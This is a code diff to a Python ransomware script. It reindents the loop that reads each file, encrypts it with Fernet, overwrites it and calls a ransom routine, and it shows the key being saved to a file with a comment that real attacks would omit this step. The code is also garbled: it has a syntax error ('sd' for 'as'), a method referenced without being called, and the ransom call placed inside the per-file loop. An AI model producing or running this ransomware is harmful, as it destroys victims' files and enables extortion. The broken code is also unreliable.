@@ -80,13 +80,13 @@ class Ransomware:
         num_encrypted_files = 0
         files = self.get_all_files()
             for file in files:
-            with open(file, "rb") as thefile:
-                contents = thefile.read()
-                num_encrypted_files += 1
-            contents_encrypted = Fernet(key).encrypt(contents)
-            with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
-        self.ransom_user()
+                with open(file, "rb") as thefile:
+                    contents = thefile.read()
+                    num_encrypted_files += 1
+                contents_encrypted = Fernet(key).encrypt(contents)
+                with open(file, "wb") as thefile:
+                    thefile.write(contents_encrypted)
+                    self.ransom_user()
 
         return num_encrypted_files
 
@@ -116,7 +116,7 @@ if __name__ == '__main__':
 
     #Find all specified files
     files = ransomware.get_all_files
-    
+
     #Generate key
     key = ransomware.key()
     with open("thekey.key","wb") sd thekey: #Key file in just to be sure we have the key, in real case scenarios this won't exist
